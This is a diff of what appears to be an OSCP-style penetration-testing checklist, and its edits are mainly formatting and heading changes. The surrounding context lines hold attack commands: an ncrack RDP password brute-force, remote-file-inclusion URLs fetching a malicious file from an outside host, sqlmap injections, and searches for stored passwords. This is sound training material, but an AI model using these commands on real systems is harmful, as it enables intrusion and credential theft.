@@ -250,7 +250,7 @@ ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRES
 - Server:
 - Scripting language:
 - Apache Modules:
-- Domain-name address (ex, oracle.acme.thinc):
+- Domain-name address:
 
 INSERTCURLHEADER
 
@@ -340,13 +340,10 @@ base64 -d savefile.php
 # Bypass extension
 http://INSERTIPADDRESS/page=http://192.168.1.101/maliciousfile.txt%00
 http://INSERTIPADDRESS/page=http://192.168.1.101/maliciousfile.txt?
-
-
-?file=.htaccess
 ```
 
 
-#### SQLInjection
+#### SQL-Injection
 
 ```
 # Post
@@ -359,7 +356,7 @@ sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql
 sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
 ```
 
-#### Login-bypass
+#### Sql-login-bypass
 
 
 - Open Burp-suite
@@ -508,9 +505,11 @@ reg query HKCU /f password /t REG_SZ /s
 ### Reconfigure service parameters
 
 - Unquoted service paths
+
 Check book for instructions
 
 - Weak service permissions
+
 Check book for instructions
 
 ### Inside service
@@ -683,9 +682,9 @@ dir /s
 
 ### Browser
 
-Browser start-page -
-Browser-history -
-Saved passwords -
+- Browser start-page:
+- Browser-history:
+- Saved passwords:
 
 ### Databases
 
